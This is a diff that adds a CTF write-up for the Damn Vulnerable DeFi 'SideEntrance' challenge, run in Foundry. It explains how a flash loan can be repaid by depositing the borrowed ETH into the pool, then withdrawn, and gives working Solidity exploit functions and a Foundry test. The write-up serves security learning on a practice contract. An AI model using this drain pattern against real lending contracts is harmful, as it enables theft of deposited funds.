@@ -108,5 +108,40 @@ https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/03
 
 ## Challenge 4: SideEntrance ##
 
+The contract vulnerability is that you can cheat lender balance, depositing his own lender balance but under your account balance. To do that, you must build a contract that borrow ETH from the lender:
+
+```
+    function exploit(address _to) external {
+        lenderContract.flashLoan(1000 ether);
+        lenderContract.withdraw();
+        payable(_to).transfer(1000 ether);
+    }
+```
+Then, flashLoan function will call execute () function in our attacker's contract which will let us deposit borrowed ETH to the lender (so now ETH is in yor balance and contract balance is still 1000ETH). This way you can pass and pay the flashloan:
+        
+        `if (address(this).balance < balanceBefore)`
+   
+```
+    function execute() external payable {
+        lenderContract.deposit{value: 1000 ether}();
+    }
+``` 
+
+Finally, in Foundry we just deploy our attacker contract:
+
+``` 
+    function testExploit() public {
+        /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        AttackerContract attackerContract = new AttackerContract(
+            address(sideEntranceLenderPool)
+        ); //deploy our attacker contract
+        attackerContract.exploit(address(attacker));
+        /** EXPLOIT END **/
+        vm.stopPrank();
+        validation();
+    }
+``` 
+
 Source Code:
 https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/04_SideEntrance
